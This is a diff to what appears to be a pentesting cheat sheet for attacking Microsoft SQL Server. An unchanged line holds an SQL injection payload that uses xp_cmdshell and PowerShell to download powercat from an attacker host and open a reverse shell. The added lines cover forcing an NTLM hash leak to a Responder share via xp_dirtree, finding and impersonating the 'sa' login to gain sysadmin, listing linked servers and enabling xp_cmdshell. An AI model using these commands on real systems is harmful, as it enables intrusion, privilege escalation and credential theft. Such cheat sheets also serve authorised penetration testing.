@@ -44,6 +44,8 @@ Enable advanced options and xp_cmdshell for command execution
 
 Test xp_cmdshell to execute system commands
 
+    exec xp_dirtree 'c:\'
+    
     EXEC xp_cmdshell 'whoami';
     GO
 
@@ -59,7 +61,45 @@ SQL Injection example to execute system commands
 
     test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://<attacker_ip>:<port>/powercat.ps1'');powercat -c <attacker_ip> -p <port> -e powershell"';--
 
-### 5) Database Usage
+Get a hash
+
+    -- Attacker: 
+
+    sudo responder -A -I tun0
+
+    -- Target:
+
+    EXEC master..xp_dirtree '\\[Attacker_IP]\share\'
+
+### 5) Impersonation (Windows AD)
+
+Check for users we can impersonate
+
+    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
+Perform the Impersonation
+
+    EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
+
+Verify Current User and Role
+
+    SELECT SYSTEM_USER
+    
+    SELECT IS_SRVROLEMEMBER('sysadmin')
+    
+    go
+
+Check Linked Databases
+
+    SELECT srvname, isremote FROM sysservers;
+
+Enable xp_cmdshell
+
+    EXEC master.dbo.sp_configure 'show advanced options', 1;
+    
+    RECONFIGURE;
+
+### 6) Database Usage
 
 List all the databases
 
